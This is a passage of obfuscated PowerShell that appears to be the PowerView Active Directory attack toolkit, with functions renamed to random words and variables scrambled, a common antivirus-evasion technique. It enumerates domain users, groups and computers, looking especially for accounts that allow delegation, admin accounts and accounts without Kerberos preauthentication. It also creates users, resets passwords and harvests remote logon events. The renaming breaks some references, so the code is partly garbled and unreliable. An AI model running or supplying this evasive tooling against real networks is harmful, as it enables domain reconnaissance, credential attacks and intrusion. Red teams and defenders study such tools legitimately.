        [ValidateRange(1, 10000)]
        [Int]
        $JFYciBwT99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $qaKJUqzZ99,
        [Switch]
        $mIpZvziV99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $biTwWENg99 = @('admincount','accountexpires','badpasswordtime','badpwdcount','cn','codepage','countrycode','description', 'displayname','distinguishedname','dscorepropagationdata','givenname','instancetype','iscriticalsystemobject','lastlogoff','lastlogon','lastlogontimestamp','lockouttime','logoncount','memberof','msds-supportedencryptiontypes','name','objectcategory','objectclass','objectguid','objectsid','primarygroupid','pwdlastset','samaccountname','samaccounttype','sn','useraccountcontrol','userprincipalname','usnchanged','usncreated','whenchanged','whencreated')
        $fYxTWpFC99 = @('admincount','cn','description','distinguishedname','dscorepropagationdata','grouptype','instancetype','iscriticalsystemobject','member','memberof','name','objectcategory','objectclass','objectguid','objectsid','samaccountname','samaccounttype','systemflags','usnchanged','usncreated','whenchanged','whencreated')
        $fpqhhLTH99 = @('accountexpires','badpasswordtime','badpwdcount','cn','codepage','countrycode','distinguishedname','dnshostname','dscorepropagationdata','instancetype','iscriticalsystemobject','lastlogoff','lastlogon','lastlogontimestamp','localpolicyflags','logoncount','msds-supportedencryptiontypes','name','objectcategory','objectclass','objectguid','objectsid','operatingsystem','operatingsystemservicepack','operatingsystemversion','primarygroupid','pwdlastset','samaccountname','samaccounttype','serviceprincipalname','useraccountcontrol','usnchanged','usncreated','whenchanged','whencreated')
        $sMQTvMNR99 = @{}
        if ($PSBoundParameters['Domain']) { $sMQTvMNR99['Domain'] = $UtXBFQsM99 }
        if ($PSBoundParameters['LDAPFilter']) { $sMQTvMNR99['LDAPFilter'] = $WmhkcxXr99 }
        if ($PSBoundParameters['SearchBase']) { $sMQTvMNR99['SearchBase'] = $nedSgaYy99 }
        if ($PSBoundParameters['Server']) { $sMQTvMNR99['Server'] = $YBAlGqrU99 }
        if ($PSBoundParameters['SearchScope']) { $sMQTvMNR99['SearchScope'] = $daZTeEQR99 }
        if ($PSBoundParameters['ResultPageSize']) { $sMQTvMNR99['ResultPageSize'] = $JFYciBwT99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $sMQTvMNR99['ServerTimeLimit'] = $qaKJUqzZ99 }
        if ($PSBoundParameters['Tombstone']) { $sMQTvMNR99['Tombstone'] = $mIpZvziV99 }
        if ($PSBoundParameters['Credential']) { $sMQTvMNR99['Credential'] = $fxunRYJT99 }
        if ($PSBoundParameters['Domain']) {
            if ($PSBoundParameters['Credential']) {
                $zFEzrnAa99 = manège -UtXBFQsM99 $UtXBFQsM99 | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
            }
            else {
                $zFEzrnAa99 = manège -UtXBFQsM99 $UtXBFQsM99 -fxunRYJT99 $fxunRYJT99 | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
            }
            Write-Verbose "[comic] Enumerated forest '$zFEzrnAa99' for target domain '$UtXBFQsM99'"
        }
        $eXkOUpfv99 = @{}
        if ($PSBoundParameters['Credential']) { $eXkOUpfv99['Credential'] = $fxunRYJT99 }
        if ($zFEzrnAa99) {
            $eXkOUpfv99['Forest'] = $zFEzrnAa99
        }
    }
    PROCESS {
        if ($PSBoundParameters['ReferencePropertySet']) {
            Write-Verbose "[comic] Using specified -ahzBjmEt99"
            $TaGhFxKb99 = $ahzBjmEt99
        }
        elseif ($PSBoundParameters['ReferenceObject']) {
            Write-Verbose "[comic] Extracting property names from -ChgzXhpE99 to use as the reference property set"
            $TaGhFxKb99 = Get-Member -XhUYaBAP99 $ChgzXhpE99 -MemberType NoteProperty | Select-Object -Expand Name
            $JEYLbnnc99 = $ChgzXhpE99.objectclass | Select-Object -Last 1
            Write-Verbose "[comic] Calculated ReferenceObjectClass : $JEYLbnnc99"
        }
        else {
            Write-Verbose "[comic] Using the default reference property set for the object class '$EqkRLZui99'"
        }
        if (($EqkRLZui99 -eq 'User') -or ($JEYLbnnc99 -eq 'User')) {
            $exXWIUqx99 = threatened @SearcherArguments
            if (-not $TaGhFxKb99) {
                $TaGhFxKb99 = $biTwWENg99
            }
        }
        elseif (($EqkRLZui99 -eq 'Group') -or ($JEYLbnnc99 -eq 'Group')) {
            $exXWIUqx99 = padlocks @SearcherArguments
            if (-not $TaGhFxKb99) {
                $TaGhFxKb99 = $fYxTWpFC99
            }
        }
        elseif (($EqkRLZui99 -eq 'Computer') -or ($JEYLbnnc99 -eq 'Computer')) {
            $exXWIUqx99 = sensationalist @SearcherArguments
            if (-not $TaGhFxKb99) {
                $TaGhFxKb99 = $fpqhhLTH99
            }
        }
        else {
            throw "[comic] Invalid class: $EqkRLZui99"
        }
        ForEach ($Object in $exXWIUqx99) {
            $ZQDzJlKJ99 = Get-Member -XhUYaBAP99 $Object -MemberType NoteProperty | Select-Object -Expand Name
            ForEach($aOvFVTAN99 in $ZQDzJlKJ99) {
                if ($TaGhFxKb99 -NotContains $aOvFVTAN99) {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'SamAccountName' $Object.SamAccountName
                    $Out | Add-Member Noteproperty 'Property' $aOvFVTAN99
                    $Out | Add-Member Noteproperty 'Value' $Object.$aOvFVTAN99
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.PropertyOutlier')
                    $Out
                }
            }
        }
    }
}
function threatened {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.User')]
    [OutputType('PowerView.User.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $soGjewdO99,
        [Switch]
        $SPN,
        [Switch]
        $FyhdEdUY99,
        [Parameter(ParameterSetName = 'AllowDelegation')]
        [Switch]
        $xjqvECfa99,
        [Parameter(ParameterSetName = 'DisallowDelegation')]
        [Switch]
        $XLjanbHs99,
        [Switch]
        $GiKMzkmO99,
        [Alias('KerberosPreauthNotRequired', 'NoPreauth')]
        [Switch]
        $YQTWaRDi99,
        [ValidateNotNullOrEmpty()]
        [String]
        $UtXBFQsM99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $WmhkcxXr99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $rtPnFfWd99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $nedSgaYy99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YBAlGqrU99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $daZTeEQR99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $JFYciBwT99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $qaKJUqzZ99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $nZWoutdh99,
        [Switch]
        $mIpZvziV99,
        [Alias('ReturnOne')]
        [Switch]
        $HyjxYAeb99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    DynamicParam {
        $vABbOHXX99 = [Enum]::GetNames($qulkrNPT99)
        $vABbOHXX99 = $vABbOHXX99 | ForEach-Object {$_; "NOT_$_"}
        salesclerk -Name UACFilter -BobOgiWP99 $vABbOHXX99 -Type ([array])
    }
    BEGIN {
        $sMQTvMNR99 = @{}
        if ($PSBoundParameters['Domain']) { $sMQTvMNR99['Domain'] = $UtXBFQsM99 }
        if ($PSBoundParameters['Properties']) { $sMQTvMNR99['Properties'] = $rtPnFfWd99 }
        if ($PSBoundParameters['SearchBase']) { $sMQTvMNR99['SearchBase'] = $nedSgaYy99 }
        if ($PSBoundParameters['Server']) { $sMQTvMNR99['Server'] = $YBAlGqrU99 }
        if ($PSBoundParameters['SearchScope']) { $sMQTvMNR99['SearchScope'] = $daZTeEQR99 }
        if ($PSBoundParameters['ResultPageSize']) { $sMQTvMNR99['ResultPageSize'] = $JFYciBwT99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $sMQTvMNR99['ServerTimeLimit'] = $qaKJUqzZ99 }
        if ($PSBoundParameters['SecurityMasks']) { $sMQTvMNR99['SecurityMasks'] = $nZWoutdh99 }
        if ($PSBoundParameters['Tombstone']) { $sMQTvMNR99['Tombstone'] = $mIpZvziV99 }
        if ($PSBoundParameters['Credential']) { $sMQTvMNR99['Credential'] = $fxunRYJT99 }
        $LRJpxUZv99 = bleachers @SearcherArguments
    }
    PROCESS {
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            salesclerk -CoUPmHUh99 -kMozdLZB99 $PSBoundParameters
        }
        if ($LRJpxUZv99) {
            $UztPqXyf99 = ''
            $bNYXjnRz99 = ''
            $soGjewdO99 | Where-Object {$_} | ForEach-Object {
                $hDkTAaiv99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($hDkTAaiv99 -match '^S-1-') {
                    $UztPqXyf99 += "(objectsid=$hDkTAaiv99)"
                }
                elseif ($hDkTAaiv99 -match '^CN=') {
                    $UztPqXyf99 += "(distinguishedname=$hDkTAaiv99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $CBPYVhlj99 = $hDkTAaiv99.SubString($hDkTAaiv99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[threatened] Extracted domain '$CBPYVhlj99' from '$hDkTAaiv99'"
                        $sMQTvMNR99['Domain'] = $CBPYVhlj99
                        $LRJpxUZv99 = bleachers @SearcherArguments
                        if (-not $LRJpxUZv99) {
                            Write-Warning "[threatened] Unable to retrieve domain searcher for '$CBPYVhlj99'"
                        }
                    }
                }
                elseif ($hDkTAaiv99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $ouzLqIgS99 = (([Guid]$hDkTAaiv99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $UztPqXyf99 += "(objectguid=$ouzLqIgS99)"
                }
                elseif ($hDkTAaiv99.Contains('\')) {
                    $zFZKzTFZ99 = $hDkTAaiv99.Replace('\28', '(').Replace('\29', ')') | spokesmen -LkQAjVeR99 Canonical
                    if ($zFZKzTFZ99) {
                        $NzTnTiPA99 = $zFZKzTFZ99.SubString(0, $zFZKzTFZ99.IndexOf('/'))
                        $pgSynGHL99 = $hDkTAaiv99.Split('\')[1]
                        $UztPqXyf99 += "(samAccountName=$pgSynGHL99)"
                        $sMQTvMNR99['Domain'] = $NzTnTiPA99
                        Write-Verbose "[threatened] Extracted domain '$NzTnTiPA99' from '$hDkTAaiv99'"
                        $LRJpxUZv99 = bleachers @SearcherArguments
                    }
                }
                else {
                    $UztPqXyf99 += "(samAccountName=$hDkTAaiv99)"
                }
            }
            if ($UztPqXyf99 -and ($UztPqXyf99.Trim() -ne '') ) {
                $bNYXjnRz99 += "(|$UztPqXyf99)"
            }
            if ($PSBoundParameters['SPN']) {
                Write-Verbose '[threatened] Searching for non-null service principal names'
                $bNYXjnRz99 += '(servicePrincipalName=*)'
            }
            if ($PSBoundParameters['AllowDelegation']) {
                Write-Verbose '[threatened] Searching for users who can be delegated'
                $bNYXjnRz99 += '(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))'
            }
            if ($PSBoundParameters['DisallowDelegation']) {
                Write-Verbose '[threatened] Searching for users who are sensitive and not trusted for delegation'
                $bNYXjnRz99 += '(userAccountControl:1.2.840.113556.1.4.803:=1048574)'
            }
            if ($PSBoundParameters['AdminCount']) {
                Write-Verbose '[threatened] Searching for adminCount=1'
                $bNYXjnRz99 += '(admincount=1)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                Write-Verbose '[threatened] Searching for users that are trusted to authenticate for other principals'
                $bNYXjnRz99 += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['PreauthNotRequired']) {
                Write-Verbose '[threatened] Searching for user accounts that do not require kerberos preauthenticate'
                $bNYXjnRz99 += '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[threatened] Using additional LDAP filter: $WmhkcxXr99"
                $bNYXjnRz99 += "$WmhkcxXr99"
            }
            $oEiFABWx99 | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $bFaXJzkM99 = $_.Substring(4)
                    $hwVZUotr99 = [Int]($qulkrNPT99::$bFaXJzkM99)
                    $bNYXjnRz99 += "(!(userAccountControl:1.2.840.113556.1.4.803:=$hwVZUotr99))"
                }
                else {
                    $hwVZUotr99 = [Int]($qulkrNPT99::$_)
                    $bNYXjnRz99 += "(userAccountControl:1.2.840.113556.1.4.803:=$hwVZUotr99)"
                }
            }
            $LRJpxUZv99.filter = "(&(samAccountType=805306368)$bNYXjnRz99)"
            Write-Verbose "[threatened] filter string: $($LRJpxUZv99.filter)"
            if ($PSBoundParameters['FindOne']) { $mKhNNgkp99 = $LRJpxUZv99.FindOne() }
            else { $mKhNNgkp99 = $LRJpxUZv99.FindAll() }
            $mKhNNgkp99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $User = $_
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User.Raw')
                }
                else {
                    $User = Johnson -rtPnFfWd99 $_.Properties
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User')
                }
                $User
            }
            if ($mKhNNgkp99) {
                try { $mKhNNgkp99.dispose() }
                catch {
                    Write-Verbose "[threatened] Error disposing of the Results object: $_"
                }
            }
            $LRJpxUZv99.dispose()
        }
    }
}
function Holden {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]
    Param(
        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $kUBgsWrg99,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Password')]
        [Security.SecureString]
        $qeLNCsfK99,
        [ValidateNotNullOrEmpty()]
        [String]
        $Name,
        [ValidateNotNullOrEmpty()]
        [String]
        $gxUGOEyw99,
        [ValidateNotNullOrEmpty()]
        [String]
        $SBBdRdJC99,
        [ValidateNotNullOrEmpty()]
        [String]
        $UtXBFQsM99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    $OIjgjDtk99 = @{
        'Identity' = $kUBgsWrg99
    }
    if ($PSBoundParameters['Domain']) { $OIjgjDtk99['Domain'] = $UtXBFQsM99 }
    if ($PSBoundParameters['Credential']) { $OIjgjDtk99['Credential'] = $fxunRYJT99 }
    $oHCkmxws99 = ethnologist @ContextArguments
    if ($oHCkmxws99) {
        $User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($oHCkmxws99.Context)
        $User.SamAccountName = $oHCkmxws99.Identity
        $VpTdRCBL99 = New-Object System.Management.Automation.PSCredential('a', $qeLNCsfK99)
        $User.SetPassword($VpTdRCBL99.GetNetworkCredential().Password)
        $User.Enabled = $True
        $User.PasswordNotRequired = $False
        if ($PSBoundParameters['Name']) {
            $User.Name = $Name
        }
        else {
            $User.Name = $oHCkmxws99.Identity
        }
        if ($PSBoundParameters['DisplayName']) {
            $User.DisplayName = $gxUGOEyw99
        }
        else {
            $User.DisplayName = $oHCkmxws99.Identity
        }
        if ($PSBoundParameters['Description']) {
            $User.Description = $SBBdRdJC99
        }
        Write-Verbose "[Holden] Attempting to create user '$kUBgsWrg99'"
        try {
            $Null = $User.Save()
            Write-Verbose "[Holden] User '$kUBgsWrg99' successfully created"
            $User
        }
        catch {
            Write-Warning "[Holden] Error creating user '$kUBgsWrg99' : $_"
        }
    }
}
function evidencing {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('UserName', 'UserIdentity', 'User')]
        [String]
        $soGjewdO99,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Password')]
        [Security.SecureString]
        $qeLNCsfK99,
        [ValidateNotNullOrEmpty()]
        [String]
        $UtXBFQsM99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    $OIjgjDtk99 = @{ 'Identity' = $soGjewdO99 }
    if ($PSBoundParameters['Domain']) { $OIjgjDtk99['Domain'] = $UtXBFQsM99 }
    if ($PSBoundParameters['Credential']) { $OIjgjDtk99['Credential'] = $fxunRYJT99 }
    $oHCkmxws99 = ethnologist @ContextArguments
    if ($oHCkmxws99) {
        $User = [System.DirectoryServices.AccountManagement.UserPrincipal]::FindByIdentity($oHCkmxws99.Context, $soGjewdO99)
        if ($User) {
            Write-Verbose "[evidencing] Attempting to set the password for user '$soGjewdO99'"
            try {
                $VpTdRCBL99 = New-Object System.Management.Automation.PSCredential('a', $qeLNCsfK99)
                $User.SetPassword($VpTdRCBL99.GetNetworkCredential().Password)
                $Null = $User.Save()
                Write-Verbose "[evidencing] Password for user '$soGjewdO99' successfully reset"
            }
            catch {
                Write-Warning "[evidencing] Error setting password for user '$soGjewdO99' : $_"
            }
        }
        else {
            Write-Warning "[evidencing] Unable to find user '$soGjewdO99'"
        }
    }
}
function figures {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LogonEvent')]
    [OutputType('PowerView.ExplicitCredentialLogonEvent')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $FRrsCtDf99 = $Env:COMPUTERNAME,
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $lagChWau99 = [DateTime]::Now.AddDays(-1),
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $tmNEVEBg99 = [DateTime]::Now,
        [ValidateRange(1, 1000000)]
        [Int]
        $dvqzloWn99 = 5000,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $mrjAVZdB99 = @"
<QueryList>
    <Query Id="0" Path="Security">
        <!-- Logon events -->
        <Select Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and (Level=4 or Level=0) and (EventID=4624)
                    and TimeCreated[
                        @SystemTime&gt;='$($lagChWau99.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$($tmNEVEBg99.ToUniversalTime().ToString('s'))'
                    ]
                ]
            ]
            and
            *[EventData[Data[@Name='TargetUserName'] != 'ANONYMOUS LOGON']]
        </Select>
        <!-- Logon with explicit credential events -->
        <Select Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and (Level=4 or Level=0) and (EventID=4648)
                    and TimeCreated[
                        @SystemTime&gt;='$($lagChWau99.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$($tmNEVEBg99.ToUniversalTime().ToString('s'))'
                    ]
                ]
            ]
        </Select>
        <Suppress Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and
                    (Level=4 or Level=0) and (EventID=4624 or EventID=4625 or EventID=4634)
                ]
            ]
            and
            *[
                EventData[
                    (
                        (Data[@Name='LogonType']='5' or Data[@Name='LogonType']='0')
                        or
                        Data[@Name='TargetUserName']='ANONYMOUS LOGON'
                        or
                        Data[@Name='TargetUserSID']='S-1-5-18'
                    )
                ]
            ]
        </Suppress>
    </Query>
</QueryList>
"@
        $FoYJlfks99 = @{
            'FilterXPath' = $mrjAVZdB99
            'LogName' = 'Security'
            'MaxEvents' = $dvqzloWn99
        }
        if ($PSBoundParameters['Credential']) { $FoYJlfks99['Credential'] = $fxunRYJT99 }
    }
    PROCESS {
        ForEach ($aJJGHudX99 in $FRrsCtDf99) {
            $FoYJlfks99['ComputerName'] = $aJJGHudX99
            Get-WinEvent @EventArguments| ForEach-Object {
                $Event = $_
                $rtPnFfWd99 = $Event.Properties
                Switch ($Event.Id) {
                    4624 {
                        if(-not $rtPnFfWd99[5].Value.EndsWith('$')) {
                            $MZchCEdW99 = New-Object PSObject -Property @{
                                ComputerName              = $aJJGHudX99
                                TimeCreated               = $Event.TimeCreated
                                EventId                   = $Event.Id
                                SubjectUserSid            = $rtPnFfWd99[0].Value.ToString()
                                SubjectUserName           = $rtPnFfWd99[1].Value
                                SubjectDomainName         = $rtPnFfWd99[2].Value
                                SubjectLogonId            = $rtPnFfWd99[3].Value
                                TargetUserSid             = $rtPnFfWd99[4].Value.ToString()
                                TargetUserName            = $rtPnFfWd99[5].Value
                                TargetDomainName          = $rtPnFfWd99[6].Value
                                TargetLogonId             = $rtPnFfWd99[7].Value
                                LogonType                 = $rtPnFfWd99[8].Value
                                LogonProcessName          = $rtPnFfWd99[9].Value
                                AuthenticationPackageName = $rtPnFfWd99[10].Value
                                WorkstationName           = $rtPnFfWd99[11].Value
                                LogonGuid                 = $rtPnFfWd99[12].Value
                                TransmittedServices       = $rtPnFfWd99[13].Value
                                LmPackageName             = $rtPnFfWd99[14].Value
                                KeyLength                 = $rtPnFfWd99[15].Value
                                ProcessId                 = $rtPnFfWd99[16].Value
                                ProcessName               = $rtPnFfWd99[17].Value
                                IpAddress                 = $rtPnFfWd99[18].Value
                                IpPort                    = $rtPnFfWd99[19].Value
                                ImpersonationLevel        = $rtPnFfWd99[20].Value
                                RestrictedAdminMode       = $rtPnFfWd99[21].Value
                                TargetOutboundUserName    = $rtPnFfWd99[22].Value
                                TargetOutboundDomainName  = $rtPnFfWd99[23].Value
                                VirtualAccount            = $rtPnFfWd99[24].Value
                                TargetLinkedLogonId       = $rtPnFfWd99[25].Value
                                ElevatedToken             = $rtPnFfWd99[26].Value
                            }
                            $MZchCEdW99.PSObject.TypeNames.Insert(0, 'PowerView.LogonEvent')
                            $MZchCEdW99
                        }
                    }
                    4648 {
                        if((-not $rtPnFfWd99[5].Value.EndsWith('$')) -and ($rtPnFfWd99[11].Value -match 'taskhost\.exe')) {
                            $MZchCEdW99 = New-Object PSObject -Property @{
                                ComputerName              = $aJJGHudX99
                                TimeCreated       = $Event.TimeCreated
                                EventId           = $Event.Id
                                SubjectUserSid    = $rtPnFfWd99[0].Value.ToString()
                                SubjectUserName   = $rtPnFfWd99[1].Value
                                SubjectDomainName = $rtPnFfWd99[2].Value
                                SubjectLogonId    = $rtPnFfWd99[3].Value
                                LogonGuid         = $rtPnFfWd99[4].Value.ToString()
                                TargetUserName    = $rtPnFfWd99[5].Value
                                TargetDomainName  = $rtPnFfWd99[6].Value
                                TargetLogonGuid   = $rtPnFfWd99[7].Value
                                TargetServerName  = $rtPnFfWd99[8].Value
                                TargetInfo        = $rtPnFfWd99[9].Value
                                ProcessId         = $rtPnFfWd99[10].Value
                                ProcessName       = $rtPnFfWd99[11].Value
                                IpAddress         = $rtPnFfWd99[12].Value
                                IpPort            = $rtPnFfWd99[13].Value
                            }
                            $MZchCEdW99.PSObject.TypeNames.Insert(0, 'PowerView.ExplicitCredentialLogonEvent')
                            $MZchCEdW99
                        }
                    }
                    default {
                        Write-Warning "No handler exists for event ID: $($Event.Id)"
                    }
                }
            }
        }
    }
}
function autopsying {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $UtXBFQsM99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YBAlGqrU99,
        [ValidateRange(1, 10000)]
        [Int]
        $JFYciBwT99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $qaKJUqzZ99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    $GUIDs = @{'00000000-0000-0000-0000-000000000000' = 'All'}
    $pVQbGfXn99 = @{}
    if ($PSBoundParameters['Credential']) { $pVQbGfXn99['Credential'] = $fxunRYJT99 }
    try {
        $bJthdVwG99 = (workaholics @ForestArguments).schema.name
    }
    catch {
        throw '[autopsying] Error in retrieving forest schema path from workaholics'
    }
    if (-not $bJthdVwG99) {
        throw '[autopsying] Error in retrieving forest schema path from workaholics'
    }
    $sMQTvMNR99 = @{
        'SearchBase' = $bJthdVwG99
        'LDAPFilter' = '(schemaIDGUID=*)'
    }
    if ($PSBoundParameters['Domain']) { $sMQTvMNR99['Domain'] = $UtXBFQsM99 }
    if ($PSBoundParameters['Server']) { $sMQTvMNR99['Server'] = $YBAlGqrU99 }
    if ($PSBoundParameters['ResultPageSize']) { $sMQTvMNR99['ResultPageSize'] = $JFYciBwT99 }
    if ($PSBoundParameters['ServerTimeLimit']) { $sMQTvMNR99['ServerTimeLimit'] = $qaKJUqzZ99 }
    if ($PSBoundParameters['Credential']) { $sMQTvMNR99['Credential'] = $fxunRYJT99 }
    $OlcJRiNU99 = bleachers @SearcherArguments
    if ($OlcJRiNU99) {
        try {
            $mKhNNgkp99 = $OlcJRiNU99.FindAll()
            $mKhNNgkp99 | Where-Object {$_} | ForEach-Object {
                $GUIDs[(New-Object Guid (,$_.properties.schemaidguid[0])).Guid] = $_.properties.name[0]
            }
            if ($mKhNNgkp99) {
                try { $mKhNNgkp99.dispose() }
                catch {
                    Write-Verbose "[autopsying] Error disposing of the Results object: $_"
                }
            }
            $OlcJRiNU99.dispose()
        }
        catch {
            Write-Verbose "[autopsying] Error in building GUID map: $_"
        }
    }
    $sMQTvMNR99['SearchBase'] = $bJthdVwG99.replace('Schema','Extended-Rights')
    $sMQTvMNR99['LDAPFilter'] = '(objectClass=controlAccessRight)'
    $Xvtnromz99 = bleachers @SearcherArguments
    if ($Xvtnromz99) {
        try {
            $mKhNNgkp99 = $Xvtnromz99.FindAll()
            $mKhNNgkp99 | Where-Object {$_} | ForEach-Object {
                $GUIDs[$_.properties.rightsguid[0].toString()] = $_.properties.name[0]
            }
            if ($mKhNNgkp99) {
                try { $mKhNNgkp99.dispose() }
                catch {
                    Write-Verbose "[autopsying] Error disposing of the Results object: $_"
                }
            }
            $Xvtnromz99.dispose()
        }
        catch {
            Write-Verbose "[autopsying] Error in building GUID map: $_"
        }
    }
    $GUIDs
}
function sensationalist {
    [OutputType('PowerView.Computer')]
    [OutputType('PowerView.Computer.Raw')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('SamAccountName', 'Name', 'DNSHostName')]
        [String[]]
        $soGjewdO99,
        [Switch]
        $ynilECNu99,
        [Switch]
        $GiKMzkmO99,
        [Switch]
        $cewtLcNw99,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePrincipalName')]
        [String]
        $SPN,
        [ValidateNotNullOrEmpty()]
        [String]
        $fvZEnbGC99,
        [ValidateNotNullOrEmpty()]
        [String]
        $fGspowYC99,
        [ValidateNotNullOrEmpty()]
        [String]
        $DgPmuXLw99,
        [Switch]
        $Ping,
        [ValidateNotNullOrEmpty()]
        [String]
        $UtXBFQsM99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $WmhkcxXr99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $rtPnFfWd99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $nedSgaYy99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YBAlGqrU99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $daZTeEQR99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $JFYciBwT99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $qaKJUqzZ99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $nZWoutdh99,
        [Switch]
        $mIpZvziV99,
        [Alias('ReturnOne')]
        [Switch]
        $HyjxYAeb99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    DynamicParam {
        $vABbOHXX99 = [Enum]::GetNames($qulkrNPT99)
        $vABbOHXX99 = $vABbOHXX99 | ForEach-Object {$_; "NOT_$_"}
        salesclerk -Name UACFilter -BobOgiWP99 $vABbOHXX99 -Type ([array])
    }
    BEGIN {
        $sMQTvMNR99 = @{}
        if ($PSBoundParameters['Domain']) { $sMQTvMNR99['Domain'] = $UtXBFQsM99 }
        if ($PSBoundParameters['Properties']) { $sMQTvMNR99['Properties'] = $rtPnFfWd99 }
        if ($PSBoundParameters['SearchBase']) { $sMQTvMNR99['SearchBase'] = $nedSgaYy99 }
